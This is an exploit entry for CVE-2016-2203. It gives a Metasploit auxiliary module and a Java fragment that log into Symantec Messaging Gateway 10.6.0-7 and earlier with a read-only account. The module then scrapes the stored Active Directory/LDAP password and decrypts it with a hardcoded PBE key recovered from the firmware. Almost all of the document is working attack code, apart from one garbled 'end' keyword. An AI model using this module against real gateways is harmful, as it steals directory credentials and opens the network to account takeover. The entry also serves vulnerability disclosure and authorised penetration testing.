# Date: 18/04/2016
# Exploit Author: Fakhir Karim Reda
# Vendor Homepage: https://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year&suid=20160418_00
# Version: 10.6.0-7 and earlier
# Tested on: Linux, Unox Windows 
# CVE : CVE-2016-2203
 
 
#Symantec Brightmail 10.6.0-7 and earlier save the AD password somewhere in the product. By having a read account on the gateway  we can recover the AD #ACOUNT/PASSWORD  
 
#indeed the html code contains the encrypted AD password.
 
#the encryption and decryption part is implemented in Java in the appliance, by reversing the code we get to know the encryption algorithm:
 
#public static String decrypt(String password)
#{
#byte clearText[];
#try{
#PBEKeySpec keySpec = new PBEKeySpec("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,./<>?;&#039;:\"{}`~!@#$%^&*()_+-=".toCharArray());
#SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBEWithMD5AndDES");
#SecretKey secretKey = keyFactory.generateSecret(keySpec);
#System.out.println("Encoded key "+ (new String(secretKey.getEncoded())));
 
 
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require "base64"
require &#039;digest&#039;
require "openssl"
 
 
class MetasploitModule < Msf::Auxiliary
 
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Symantec Messaging Gateway 10 LDAP Creds Graber&#039;,
      &#039;Description&#039;    => %q{
          This module will  grab the AD account saved in Symantec Messaging Gateway and then decipher it using the disclosed symantec pbe key.  Note that authentication is required in order to successfully grab the LDAP credentials, you need at least a read account. Version 10.6.0-7 and earlier are affected
 
      },
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;,&#039;https://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20160418_00&#039;],
          [&#039;CVE&#039;,&#039;2016-2203&#039;],
          [&#039;BID&#039;,&#039;86137&#039;]
        ],
 
      &#039;Author&#039;         =>
        [
          &#039;Fakhir Karim Reda <karim.fakhir[at]gmail.com>&#039;
        ],
       &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039; => true,
          &#039;SSLVersion&#039; => &#039;TLS1&#039;,
          &#039;RPORT&#039; => 443
        },
       &#039;License&#039;        => MSF_LICENSE,
       &#039;DisclosureDate&#039; => "Dec 17 2015"
    ))
    register_options(
      [
        OptInt.new(&#039;TIMEOUT&#039;, [true, &#039;HTTPS connect/read timeout in seconds&#039;, 1]),
        Opt::RPORT(443),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to login as&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to login with&#039;])
      ], self.class)
    deregister_options(&#039;RHOST&#039;)
  end
 
 
  def print_status(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end
 
  def print_good(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end
 
  def print_error(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end
 
  def report_cred(opts)
   service_data = {
    address: opts[:ip],
    port: opts[:port],
    service_name: &#039;LDAP&#039;,
    protocol: &#039;tcp&#039;,
    workspace_id: myworkspace_id
   }
   credential_data = {
    origin_type: :service,
    module_fullname: fullname,
    username: opts[:user],
    private_data: opts[:password],
    private_type: :password
   }.merge(service_data)
   login_data = {
    last_attempted_at: DateTime.now,
    core: create_credential(credential_data),
    status: Metasploit::Model::Login::Status::SUCCESSFUL,
    proof: opts[:proof]
   }.merge(service_data)
 
   create_credential_login(login_data)
  end
 
  def auth(username, password, sid, last_login)
    # Real JSESSIONID  cookie
    sid2 = &#039;&#039;
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => &#039;/brightmail/login.do&#039;,
      &#039;headers&#039;   => {
        &#039;Referer&#039; => "https://#{peer}/brightmail/viewLogin.do",
        &#039;Connection&#039; => &#039;keep-alive&#039;
      },
      &#039;cookie&#039;    => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}",
      &#039;vars_post&#039; => {
        &#039;lastlogin&#039;  => last_login,
        &#039;userLocale&#039; => &#039;&#039;,
        &#039;lang&#039;       => &#039;en_US&#039;,
        &#039;username&#039;   => username,
        &#039;password&#039;   => password,
        &#039;loginBtn&#039;   => &#039;Login&#039;
      }
    })
   if res.body =~ /Logged in/
      sid2 = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0] || &#039;&#039;
      return sid2
   end
   if res and res.headers[&#039;Location&#039;]
     mlocation = res.headers[&#039;Location&#039;]
     new_uri = res.headers[&#039;Location&#039;].scan(/^http:\/\/[\d\.]+:\d+(\/.+)/).flatten[0]
     res = send_request_cgi({
        &#039;uri&#039;    => new_uri,
        &#039;cookie&#039; => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}"
     })
     sid2 = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0] || &#039;&#039;
     return sid2  if res and res.body =~ /Logged in/
   end
   return false
  end
 
  def get_login_data
    sid        = &#039;&#039;  #From cookie
    last_login = &#039;&#039;  #A hidden field in the login page
    res = send_request_raw({&#039;uri&#039;=>&#039;/brightmail/viewLogin.do&#039;})
    if res and !res.get_cookies.empty?
      sid = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0] || &#039;&#039;
    end
    if res
      last_login = res.body.scan(/<input type="hidden" name="lastlogin" value="(.+)"\/>/).flatten[0] || &#039;&#039;
    end
    return sid, last_login
  end
 
  # Returns the status of the listening port.
  #
  # @return [Boolean] TrueClass if port open, otherwise FalseClass.
 
  def port_open?
    begin
      res = send_request_raw({&#039;method&#039; => &#039;GET&#039;, &#039;uri&#039; => &#039;/&#039;}, datastore[&#039;TIMEOUT&#039;])
      return true if res
    rescue ::Rex::ConnectionRefused
      print_status("#{peer} - Connection refused")
      return false
    rescue ::Rex::ConnectionError
      print_error("#{peer} - Connection failed")
      return false
    rescue ::OpenSSL::SSL::SSLError
      print_error("#{peer} - SSL/TLS connection error")
      return false
    end
  end
 
  # Returns the derived key from the password, the salt and the iteration count number.
  #
  # @return Array of byte containing the derived key.
  def get_derived_key(password, salt, count)
    key = password + salt
    for i in 0..count-1
        key = Digest::MD5.digest(key)
    end
    kl = key.length
    return key[0,8], key[8,kl]
  end
 
 
  # @Return the deciphered password
  # Algorithm obtained by reversing the firmware
  #
  def decrypt(enc_str)
    pbe_key="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,./<>?;&#039;:\"\\{}`~!@#$%^&*()_+-="
    salt = (Base64.strict_decode64(enc_str[0,12]))
    remsg = (Base64.strict_decode64(enc_str[12,enc_str.length]))
    (dk, iv) = get_derived_key(pbe_key, salt, 1000)
    alg = "des-cbc"
    decode_cipher = OpenSSL::Cipher::Cipher.new(alg)
    decode_cipher.decrypt
    decode_cipher.padding = 0
    decode_cipher.key = dk
    decode_cipher.iv = iv
    plain = decode_cipher.update(remsg)
    plain << decode_cipher.final
    return  plain.gsub(/[\x01-\x08]/,&#039;&#039;)
  end
 
 def grab_auths(sid,last_login)
  token = &#039;&#039; #from hidden input
  selected_ldap = &#039;&#039; # from checkbox input
  new_uri = &#039;&#039; # redirection
  flow_id = &#039;&#039; # id of the flow
  folder = &#039;&#039; # symantec folder
  res = send_request_cgi({
   &#039;method&#039;    => &#039;GET&#039;,
   &#039;uri&#039;       => "/brightmail/setting/ldap/LdapWizardFlow$exec.flo",
   &#039;headers&#039;   => {
    &#039;Referer&#039; => "https://#{peer}/brightmail/setting/ldap/LdapWizardFlow$exec.flo",
    &#039;Connection&#039; => &#039;keep-alive&#039;
   },
   &#039;cookie&#039;    => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid};"
   })
   if res
    token = res.body.scan(/<input type="hidden" name="symantec.brightmail.key.TOKEN" value="(.+)"\/>/).flatten[0] || &#039;&#039;
    selected_ldap = res.body.scan(/<input type="checkbox" value="(.+)" name="selectedLDAP".+\/>/).flatten[0] || &#039;&#039;
   else
    return false
   end
   res = send_request_cgi({
    &#039;method&#039;    => &#039;POST&#039;,
    &#039;uri&#039;       => "/brightmail/setting/ldap/LdapWizardFlow$edit.flo",
    &#039;headers&#039;   => {
     &#039;Referer&#039; => "https://#{peer}/brightmail/setting/ldap/LdapWizardFlow$exec.flo",
     &#039;Connection&#039; => &#039;keep-alive&#039;
    },
    &#039;cookie&#039;    => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}; ",
    &#039;vars_post&#039;  => {
     &#039;flowId&#039;  => &#039;0&#039;,
     &#039;userLocale&#039; => &#039;&#039;,
     &#039;lang&#039;       => &#039;en_US&#039;,
     &#039;symantec.brightmail.key.TOKEN&#039;=> "#{token}",
     &#039;selectedLDAP&#039; => "#{selected_ldap}"
    }
   })
   if res and res.headers[&#039;Location&#039;]
    mlocation = res.headers[&#039;Location&#039;]
    new_uri = res.headers[&#039;Location&#039;].scan(/^https:\/\/[\d\.]+(\/.+)/).flatten[0]
    flow_id =  new_uri.scan(/.*\?flowId=(.+)/).flatten[0]
    folder = new_uri.scan(/(.*)\?flowId=.*/).flatten[0]
   else
    return false
   end
   res = send_request_cgi({
    &#039;method&#039;    => &#039;GET&#039;,
    &#039;uri&#039;       => "#{folder}",
    &#039;headers&#039;   => {
     &#039;Referer&#039; => "https://#{peer}/brightmail/setting/ldap/LdapWizardFlow$exec.flo",
     &#039;Connection&#039; => &#039;keep-alive&#039;
    },
    &#039;cookie&#039;    => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}; ",
    &#039;vars_get&#039;  => {
     &#039;flowId&#039;  => "#{flow_id}",
     &#039;userLocale&#039; => &#039;&#039;,
     &#039;lang&#039;       => &#039;en_US&#039;
    }
   })
   if res and res.code == 200
    login = res.body.scan(/<input type="text" name="userName".*value="(.+)"\/>/).flatten[0] || &#039;&#039;
    password = res.body.scan(/<input type="password" name="password".*value="(.+)"\/>/).flatten[0] || &#039;&#039;
    host =  res.body.scan(/<input name="host" id="host" type="text" value="(.+)" class/).flatten[0] || &#039;&#039;
    port =  res.body.scan(/<input name="port" id="port" type="text" value="(.+)" class/).flatten[0] || &#039;&#039;
    password = decrypt(password)
    print_good("Found login = &#039;#{login}&#039; password = &#039;#{password}&#039; host =&#039;#{host}&#039; port = &#039;#{port}&#039; ")
    report_cred(ip: host, port: port, user:login, password: password, proof: res.code.to_s)
   end
  end
 
  def run_host(ip)
    return unless port_open?
    sid, last_login = get_login_data
    if sid.empty? or last_login.empty?
      print_error("#{peer} - Missing required login data.  Cannot continue.")
      return
    end
    username = datastore[&#039;USERNAME&#039;]
    password = datastore[&#039;PASSWORD&#039;]
    sid = auth(username, password, sid, last_login)
    if not sid
      print_error("#{peer} - Unable to login.  Cannot continue.")
      return
    else
      print_good("#{peer} - Logged in as &#039;#{username}:#{password}&#039; Sid: &#039;#{sid}&#039; LastLogin &#039;#{last_login}&#039;")
    e   nd
    grab_auths(sid,last_login)
  end
end

